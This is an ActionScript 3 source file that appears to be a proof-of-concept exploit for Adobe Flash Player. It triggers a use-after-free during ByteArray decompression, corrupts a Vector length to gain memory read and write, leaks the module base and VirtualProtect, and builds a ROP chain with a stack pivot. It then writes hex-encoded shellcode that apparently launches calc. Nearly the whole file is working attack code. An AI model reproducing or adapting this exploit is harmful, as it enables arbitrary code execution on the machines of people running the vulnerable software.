package {

    import __AS3__.vec.*;
    import flash.display.*;
    import flash.media.*;
    import flash.net.*;
    import flash.system.*;
    import flash.text.*;
    import flash.utils.*;
	import avm2.intrinsics.memory.casi32;
	import flash.system.ApplicationDomain;
	
	public class Main extends Sprite{
		
		private function GetOffset(base:uint, target:uint) : uint {
			if (base < target){
				return int((target - base) / 4) - 2;
			} else{
				return int((0x100000000 / 4) + (target / 4) - (base / 4)) - 2;
			}
		}
		
		public function Main(){
			
			trace("--------------- Start ---------------");
			
			var i:uint, j:uint;
			var ci:uint, base:uint;
			var uv:* = new Vector.<Object>(0);
			var ba:* = new ByteArray();
			var spray:* = new Vector.<Object>(0);
			var eSound:* = new Sound(), eSoundAddr:uint, eSoundVtable:uint;
			
			var PEbase:uint;
			var VirtualProtect:uint;
			var scaddr:uint;
			
			var g1:uint = 0xa882; // xchg eax, esp;
			
			ba.endian = Endian.LITTLE_ENDIAN;
			
			// fill the holes.
			for (i = 0; i < 0x1000; i++){
				spray[i] = new Vector.<uint>(0x7fe);
			}
			
			// Set bytearray
			for (i = 0; i < 0x2000/4; i++){
				ba.writeUnsignedInt(0xdeaddead+i);
			}
			ba.compress();
			
			ba.position = 0x200;
			for (i = 0; i < (ba.length - ba.position)/4; i++){
				ba.writeUnsignedInt(0xbeefbeef);
			}
			ApplicationDomain.currentDomain.domainMemory = ba;
			
			try{ // uaf triggered
				ba.uncompress();
			} catch (error:Error){ trace("Trigger"); };
			
			// fill the holes.
			for (i = 0; i < 0x200;i++){
				if(i<4){
					uv[i] = new Vector.<uint>(0x7fe);
					uv[i][0] = 0xcafecafe+i;
					uv[i][uv[i].length - 1] = 0xbabebabe+i;
				}
				else{
					uv[i] = new Vector.<Object>(0x416);
					for (j = 0; j < 0x416; j++){
						uv[i][j] = eSound;
					}
				}
			}
			casi32(0, 0x7fe, 0xffffffff); // change vector length
			trace("Changing length...");
			
			// find the corrupted vector
			for (i = 0; i < 4; i++){
				// trace("uv["+i.toString()+"].length = "+uv[i].length.toString(16));
				if (uv[i].length > 0x7fe){
					ci = i;
					break;
				}
			} if (i == 0x100){
				while (1){};
			}
			trace("uv["+ci.toString()+"].length = "+uv[ci].length.toString(16));
			
			// calculate offsets.
			for (i = 0; i < 20; i++){
				if (uv[ci][(0x2000 * i) / 4] != 0xcafecafe+i){
					trace("debug " + i.toString(16) + " : " + uv[ci][(0x2000 * i) / 4].toString(16));
					trace("calc : " + uv[ci][((0x2000 * i) / 4) + 3]);
					base = (uv[ci][((0x2000 * i) / 4) + 3] - 0x18) - 0x2000 * i;
					eSoundAddr = uv[ci][((0x2000 * i) / 4) + 20] & 0xfffffff8;
					break;
				}
			}
			trace("base = " + base.toString(16));
			trace("eSound Address = " + eSoundAddr.toString(16));
			eSoundVtable = GetOffset(base, eSoundAddr);
			PEbase = uv[ci][eSoundVtable] - 0x8e4ad0; // Sound().toString offset
			VirtualProtect = uv[ci][GetOffset(base, PEbase+0x817510)]; // VirtualProtect()'s IAT
			g1 += PEbase;
			scaddr = base+0x1000;
			trace("VirtualProtect() = " + VirtualProtect.toString(16));
			
			// get eip
			uv[ci][eSoundVtable] = scaddr;
			
			// xchg eax, esp
			uv[ci][GetOffset(base, scaddr + 0x78)] = g1; // trigger xchg eax, esp so esp can be scaddr
			
			// rop
			
			// VirtualProtect(scaddr, 0x1000, 0x40, scaddr);
			uv[ci][GetOffset(base, scaddr + 0x00)] = VirtualProtect;
			uv[ci][GetOffset(base, scaddr + 0x04)] = scaddr + 0x80;
			uv[ci][GetOffset(base, scaddr + 0x08)] = scaddr;
			uv[ci][GetOffset(base, scaddr + 0x0c)] = 0x1000;
			uv[ci][GetOffset(base, scaddr + 0x10)] = 0x40;
			uv[ci][GetOffset(base, scaddr + 0x14)] = scaddr;
			
			// shellcode
			for (i = 0; i < 0x100/4; i++){
				uv[ci][GetOffset(base, scaddr + 0x80) + i] = 0x90909090;
			}
			uv[ci][GetOffset(base, scaddr + 0x180 + 0x00)] = 0x8b64db31;
			uv[ci][GetOffset(base, scaddr + 0x180 + 0x04)] = 0x7f8b307b;
			uv[ci][GetOffset(base, scaddr + 0x180 + 0x08)] = 0x1c7f8b0c;
			uv[ci][GetOffset(base, scaddr + 0x180 + 0x0c)] = 0x8b08478b;
			uv[ci][GetOffset(base, scaddr + 0x180 + 0x10)] = 0x3f8b2077;
			uv[ci][GetOffset(base, scaddr + 0x180 + 0x14)] = 0x330c7e80;
			uv[ci][GetOffset(base, scaddr + 0x180 + 0x18)] = 0xc789f275;
			uv[ci][GetOffset(base, scaddr + 0x180 + 0x1c)] = 0x8b3c7803;
			uv[ci][GetOffset(base, scaddr + 0x180 + 0x20)] = 0xc2017857;
			uv[ci][GetOffset(base, scaddr + 0x180 + 0x24)] = 0x01207a8b;
			uv[ci][GetOffset(base, scaddr + 0x180 + 0x28)] = 0x8bdd89c7;
			uv[ci][GetOffset(base, scaddr + 0x180 + 0x2c)] = 0xc601af34;
			uv[ci][GetOffset(base, scaddr + 0x180 + 0x30)] = 0x433e8145;
			uv[ci][GetOffset(base, scaddr + 0x180 + 0x34)] = 0x75616572;
			uv[ci][GetOffset(base, scaddr + 0x180 + 0x38)] = 0x087e81f2;
			uv[ci][GetOffset(base, scaddr + 0x180 + 0x3c)] = 0x7365636f;
			uv[ci][GetOffset(base, scaddr + 0x180 + 0x40)] = 0x7a8be975;
			uv[ci][GetOffset(base, scaddr + 0x180 + 0x44)] = 0x66c70124;
			uv[ci][GetOffset(base, scaddr + 0x180 + 0x48)] = 0x8b6f2c8b;
			uv[ci][GetOffset(base, scaddr + 0x180 + 0x4c)] = 0xc7011c7a;
			uv[ci][GetOffset(base, scaddr + 0x180 + 0x50)] = 0xfcaf7c8b;
			uv[ci][GetOffset(base, scaddr + 0x180 + 0x54)] = 0xd989c701;
			uv[ci][GetOffset(base, scaddr + 0x180 + 0x58)] = 0xe253ffb1;
			uv[ci][GetOffset(base, scaddr + 0x180 + 0x5c)] = 0x616368fd;
			uv[ci][GetOffset(base, scaddr + 0x180 + 0x60)] = 0xe289636c;
			uv[ci][GetOffset(base, scaddr + 0x180 + 0x64)] = 0x53535252;
			uv[ci][GetOffset(base, scaddr + 0x180 + 0x68)] = 0x53535353;
			uv[ci][GetOffset(base, scaddr + 0x180 + 0x6c)] = 0xd7ff5352;
			
			// Start Exploit.
			new Number(eSound.toString());
			
			trace("End of exploit.");
			while (1){ };
			
		}
	}
}
